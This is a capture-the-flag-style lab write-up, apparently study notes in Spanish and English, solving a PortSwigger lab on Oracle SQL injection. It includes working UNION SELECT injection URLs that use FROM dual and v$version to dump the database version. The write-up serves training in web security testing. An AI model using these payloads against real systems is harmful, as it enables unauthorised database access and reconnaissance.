# `LAB`: SQL injection attack, querying the database type and version on Oracle

## Descripción:

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

## Hint

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

- **There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`**

### Oracle Cheastsheet:

- [PortSwigger - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


---

### Explicación:

- En Oracle siempre hay que utilizar una tabla _(o casi siempre...)_. Llamada: `dual`

Es decir, a la Query normal de SQL se podría agregar el `FROM dual`: 

````py
## SQLi Quey para SQL: (Este da error en Oracle!!!)
.web-security-academy.net/filter?category=Pets' Union Select '1','2' -- -

## SQLi Quey para Oracle: Booom!!!!
.web-security-academy.net/filter?category=Pets' Union Select '1','2' FROM dual -- -
````

El otro punto importante es utilizar los querys de Oracle para mostrar la información de la Base de Datos:

````sql
# Opción 1
SELECT banner FROM v$version
# Opción 2
SELECT version FROM v$instance
````

Es decir:

````py
## Es decir:

# Opción 1
.web-security-academy.net/filter?category=Pets' Union Select '1',banner FROM v$version --+-
# Opción 2 (Esta no sirve en este caso y da error...)
.web-security-academy.net/filter?category=Pets' Union Select '1',version FROM v$instance --+-
````

## Solución:

````py
## SQLi Quey para SQL: Prabando el Fuzzig, este query de SQL dará error de Oracle
.web-security-academy.net/filter?category=Pets' Union Select '1','2' -- -

## SQLi Quey para Oracle: Booom!!!!
.web-security-academy.net/filter?category=Pets' Union Select '1','2' FROM dual -- -

## Revisando el cheatsheet de portswigger de Oracle se puede encontrar el Query para mostrar DB Version

# Oracle DB Info Dump:
.web-security-academy.net/filter?category=Pets' Union Select '1',banner FROM v$version --+-

````
